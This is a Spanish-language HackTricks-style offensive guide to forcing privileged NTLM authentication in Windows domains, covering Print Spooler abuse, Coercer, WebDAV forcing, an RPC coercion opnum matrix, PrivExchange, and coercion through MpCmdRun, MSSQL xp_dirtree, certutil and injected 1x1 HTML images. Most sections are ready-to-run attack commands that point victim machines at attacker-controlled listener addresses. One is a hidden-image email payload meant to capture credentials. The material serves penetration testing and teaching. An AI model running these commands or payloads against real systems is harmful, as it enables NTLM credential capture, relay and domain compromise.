# Force NTLM Autenticación Privilegiada

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) es una **colección** de **disparadores de autenticación remota** codificados en C# usando el compilador MIDL para evitar dependencias de terceros.

## Spooler Service Abuse

Si el servicio _**Print Spooler**_ está **habilitado,** puedes usar algunas credenciales de AD ya conocidas para **solicitar** al servidor de impresión del Domain Controller una **actualización** sobre nuevos trabajos de impresión y simplemente indicarle que **envíe la notificación a algún sistema**.\
Ten en cuenta que cuando la impresora envía la notificación a un sistema arbitrario, necesita **autenticarse contra** ese **sistema**. Por lo tanto, un atacante puede hacer que el servicio _**Print Spooler**_ se autentique contra un sistema arbitrario, y el servicio utilizará la cuenta de equipo en esta autenticación.

Bajo el capó, el primitivo clásico **PrinterBug** abusa de **`RpcRemoteFindFirstPrinterChangeNotificationEx`** sobre **`\\PIPE\\spoolss`**. El atacante primero abre un handle de impresora/servidor y luego suministra un nombre de cliente falso en `pszLocalMachine`, de modo que el spooler objetivo crea un canal de notificación **de vuelta hacia el host controlado por el atacante**. Por eso el efecto es **coerción de autenticación saliente** en lugar de ejecución directa de código.\
Si estás buscando **RCE/LPE** en el propio spooler, revisa [PrintNightmare](printnightmare.md). Esta página se centra en **coercion y relay**.

### Finding Windows Servers on the domain

Usando PowerShell, obtiene una lista de máquinas Windows. Normalmente los servidores tienen prioridad, así que centrémonos en ellos:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Encontrar servicios Spooler escuchando

Usando una versión ligeramente modificada de @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), comprueba si el Spooler Service está escuchando:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
También puedes usar `rpcdump.py` en Linux y buscar el protocolo **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
O prueba rápidamente hosts desde Linux con **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Si quieres **enumerar superficies de coerción** en lugar de solo comprobar si existe el endpoint del spooler, usa **Coercer scan mode**:
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Esto es útil porque ver el endpoint en EPM solo te indica que la interfaz RPC de impresión está registrada. No garantiza que cada método de coercion sea accesible con tus privilegios actuales ni que el host emita un flujo de autenticación utilizable.

### Pide al servicio que se autentique contra un host arbitrario

Puedes compilar [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
o usa [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) o [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si estás en Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Con **Coercer**, puedes apuntar directamente a las interfaces del spooler y evitar adivinar qué método RPC está expuesto:
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Forzando HTTP en lugar de SMB con WebClient

El clásico PrinterBug normalmente genera una autenticación **SMB** a `\\attacker\share`, que sigue siendo útil para **capture**, **relay to HTTP targets** o **relay where SMB signing is absent**.\
Sin embargo, en entornos modernos, relaying **SMB to SMB** a menudo se bloquea por **SMB signing**, así que los operadores suelen preferir forzar autenticación **HTTP/WebDAV** en su lugar.

Si el objetivo tiene el servicio **WebClient** en ejecución, el listener puede especificarse en un formato que hace que Windows use **WebDAV over HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Esto es especialmente útil cuando se encadena con **`ntlmrelayx --adcs`** u otros destinos de relay HTTP porque evita depender de la relayability de SMB en la conexión coercida. La advertencia importante es que **WebClient debe estar en ejecución** en la víctima para que funcione la variante HTTP/WebDAV.

### Combinando con Unconstrained Delegation

Si un atacante ya ha comprometido un equipo con [Unconstrained Delegation](unconstrained-delegation.md), el atacante podría **hacer que la impresora se autentique contra este equipo**. Debido a la unconstrained delegation, el **TGT** de la **cuenta de equipo de la impresora** será **guardado en** la **memoria** del equipo con unconstrained delegation. Como el atacante ya ha comprometido este host, podrá **recuperar este ticket** y abusar de él ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: interfaz de impresión asíncrona en el mismo spooler pipe; usa Coercer para enumerar los métodos alcanzables en un host dado
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (también vía \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Nota: Estos métodos aceptan parámetros que pueden contener una ruta UNC (por ejemplo, `\\attacker\share`). Cuando se procesan, Windows se autenticará (contexto de máquina/usuario) ante ese UNC, permitiendo capturar o relayar NetNTLM.\
Para el abuso de spooler, **MS-RPRN opnum 65** sigue siendo el primitivo más común y mejor documentado porque la especificación del protocolo declara explícitamente que el servidor crea un canal de notificación de vuelta al cliente especificado por `pszLocalMachine`.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: the target attempts to open the supplied backup log path and authenticates to the attacker-controlled UNC.
- Practical use: coerce Tier 0 assets (DC/RODC/Citrix/etc.) to emit NetNTLM, then relay to AD CS endpoints (ESC8/ESC11 scenarios) or other privileged services.

## PrivExchange

El ataque `PrivExchange` es el resultado de un fallo encontrado en la funcionalidad **Exchange Server `PushSubscription`**. Esta funcionalidad permite forzar al servidor Exchange, por cualquier usuario de dominio con buzón, a autenticarse contra cualquier host proporcionado por el cliente a través de HTTP.

Por defecto, el servicio **Exchange se ejecuta como SYSTEM** y se le conceden privilegios excesivos (específicamente, tiene **WriteDacl privileges on the domain pre-2019 Cumulative Update**). Este fallo puede explotarse para permitir el **relaying of information to LDAP and subsequently extract the domain NTDS database**. En casos en los que no sea posible relayar a LDAP, este fallo aún puede usarse para relay y autenticarse contra otros hosts dentro del dominio. La explotación exitosa de este ataque otorga acceso inmediato al Domain Admin con cualquier cuenta de usuario de dominio autenticada.

## Inside Windows

Si ya estás dentro de la máquina Windows puedes forzar a Windows a conectarse a un servidor usando cuentas privilegiadas con:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
O usa esta otra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Es posible usar certutil.exe lolbin (binario firmado por Microsoft) para forzar autenticación NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Si conoces la **dirección de correo electrónico** del usuario que inicia sesión en una máquina que quieres comprometer, podrías simplemente enviarle un **email con una imagen de 1x1** como por ejemplo
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
y cuando lo abra, intentará autenticarse.

### MitM

Si puedes realizar un ataque MitM a un ordenador e inyectar HTML en una página que visualizará, podrías intentar inyectar una imagen como la siguiente en la página:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Otras formas de forzar y hacer phishing de autenticación NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Si puedes capturar [las challenges NTLMv1, lee aquí cómo crackearlas](../ntlm/index.html#ntlmv1-attack).\
_Recuerda que para crackear NTLMv1 necesitas configurar la challenge de Responder en "1122334455667788"_

## Referencias
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
